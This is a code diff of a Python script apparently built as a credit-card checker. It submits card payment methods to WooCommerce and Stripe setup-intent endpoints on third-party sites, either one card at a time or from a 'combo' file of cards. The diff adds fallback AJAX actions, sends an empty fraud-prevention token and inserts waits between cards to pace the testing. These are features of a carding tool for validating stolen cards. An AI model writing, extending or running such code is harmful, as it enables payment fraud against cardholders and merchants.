@@ -239,15 +239,36 @@ def Stripe1(card_data, site_url):
             'x-requested-with': 'XMLHttpRequest',
         }
 
-        data = {
-            'action': 'create_setup_intent',
-            'wcpay-payment-method': payment_id,
-            '_ajax_nonce': addnonce,
-            'wcpay-fraud-prevention-token': '',
-        }
+        # تجربة actions مختلفة
+        actions = ['create_setup_intent', 'wc_stripe_create_and_confirm_setup_intent']
+        text = ''
 
-        response = r.post(f'{site_url}/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
-        text = response.text
+        for action in actions:
+            print(f"    🔄 Trying action: {action}")
+
+            if action == 'create_setup_intent':
+                data = {
+                    'action': action,
+                    'wcpay-payment-method': payment_id,
+                    '_ajax_nonce': addnonce,
+                    'wcpay-fraud-prevention-token': '',
+                }
+            else:
+                data = {
+                    'action': action,
+                    'wc-stripe-payment-method': payment_id,
+                    'wc-stripe-payment-type': 'card',
+                    '_ajax_nonce': addnonce,
+                }
+
+            response = r.post(f'{site_url}/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
+            text = response.text
+
+            if text != '0' and 'error' not in text.lower():
+                print(f"    ✅ Action '{action}' succeeded")
+                break
+            else:
+                print(f"    ❌ Action '{action}' failed")
 
         print("\n" + "="*60)
         print(f"📄 Response: {text[:200]}")
@@ -283,12 +304,12 @@ def Stripe1(card_data, site_url):
                 result = f'Unknown: {text[:50]}'
 
         print(f"\n📊 النتيجة: {result}")
-        
-        # ===== وقت الانتظار =====
+
+        # ===== ⏱️ وقت الانتظار بين البطاقات =====
         wait_time = get_wait_time()
         print(f"[⏱️] انتظار {wait_time} ثانية قبل البطاقة التالية...")
         time.sleep(wait_time)
-        
+
         return result
 
     except Exception as e:
@@ -301,9 +322,9 @@ if __name__ == '__main__':
     print("="*60)
     print(f"⏱️ وقت الانتظار بين البطاقات: {WAIT_TIME} ثانية")
     print("="*60)
-    
+
     Br = input('Enter Numer (Manual : 1 - Combo : 2) : ')
-    
+
     if Br == '1':
         try:
             while True:
@@ -319,6 +340,7 @@ if __name__ == '__main__':
             print('\n🛑 تم الإيقاف بواسطة المستخدم')
         except Exception as e:
             print(f'Error - {e}')
+            time.sleep(2)
     else:
         noy = 0
         cr = input('Enter Name Combo: ')
@@ -340,3 +362,4 @@ if __name__ == '__main__':
             print(f'❌ ملف {cr} غير موجود!')
         except Exception as e:
             print(f'Error - {e}')
+            time.sleep(2)
